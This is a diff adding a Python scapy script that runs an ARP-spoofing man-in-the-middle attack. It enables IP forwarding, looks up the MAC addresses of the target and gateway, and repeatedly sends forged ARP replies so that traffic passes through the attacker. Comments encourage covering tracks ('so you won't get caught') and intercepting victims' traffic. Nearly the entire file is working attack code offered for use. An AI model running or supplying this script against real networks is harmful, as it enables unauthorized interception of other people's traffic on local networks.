@@ -1,0 +1,74 @@
+#! /usr/bin/python3
+
+import scapy.all as scapy
+import subprocess as sp
+import optparse as opt
+import re
+import time
+
+def get_parameters():
+    parse_obj = opt.OptionParser()
+    parse_obj.add_option("-t", "--target", dest="target_ip", help="ip of target")
+    parse_obj.add_option("-r", "--router", dest="router_ip", help="ip of router")
+
+    (user_inputs, arguments) = parse_obj.parse_args()
+    targeted_ip = user_inputs.target_ip
+    router_ip = user_inputs.router_ip
+    return targeted_ip, router_ip
+def ip_forward():
+    ip_forw_output = sp.check_output(["cat", "/proc/sys/net/ipv4/ip_forward"])
+    is_ip_forward_on_byte = re.search(b"\d", ip_forw_output)
+    is_ip_forward_on = is_ip_forward_on_byte.group().decode("utf-8")
+    if is_ip_forward_on == "0":
+        sp.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
+        print("IP forward activated")
+    else:
+        print("IP forward is already active")
+
+
+def find_mac(target_ip):
+    arp_req = scapy.ARP(pdst=target_ip)
+    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    big_packet = broadcast_packet/arp_req
+    answered_list = scapy.srp(big_packet, timeout=1, verbose=False)[0]
+    mac_of_target = answered_list[0][1].hwsrc
+
+    return mac_of_target
+def arp_response(target_ip, spoofed_ip):
+
+    mac_of_target = find_mac(target_ip) # finding MAC of target or router
+
+    arp_resp = scapy.ARP(op=2, pdst=target_ip, hwdst=mac_of_target, psrc=spoofed_ip)
+    scapy.send(arp_resp, verbose=False)
+
+def going_dark(target_ip, our_ip):  # resetting ARP so you won't get caught :)
+    mac_of_target = find_mac(target_ip)  # finding MAC of target or router
+    mac_of_us = find_mac(our_ip)
+    arp_resp = scapy.ARP(op=2, pdst=target_ip, hwdst=mac_of_target, psrc=our_ip, hwsrc=mac_of_us)
+    scapy.send(arp_resp, verbose=False)
+
+def pack_output(number_of_packs):
+    number_of_packs += 2
+    print("\rSending " + str(number_of_packs) + " packets. You are in the middle.", end="")
+    return number_of_packs
+
+def __main__():
+    ip_forward()
+    target_ip, spoofed_ip = get_parameters()
+    number_of_packs = 0
+    print("\nGot " + find_mac(target_ip) + " as MAC address of target\n")
+    print("\nGot " + find_mac(spoofed_ip) + " as MAC address of gateway\n")
+    while True:
+        arp_response(target_ip, spoofed_ip) # spoofing target computer
+        arp_response(spoofed_ip, target_ip) # spoofing router
+        number_of_packs = pack_output(number_of_packs)
+        time.sleep(3)  # protection of hardware :)
+
+try:
+ # start of code
+    __main__()
+except KeyboardInterrupt:
+    print("\n\nStopping Man In The Mıddle by your free will. I hope you caught what you wanted.")
+    t_ip, g_ip = get_parameters()  # target ip and gateway ip
+    going_dark(t_ip, g_ip)
+    print("Stopped and resetted.")
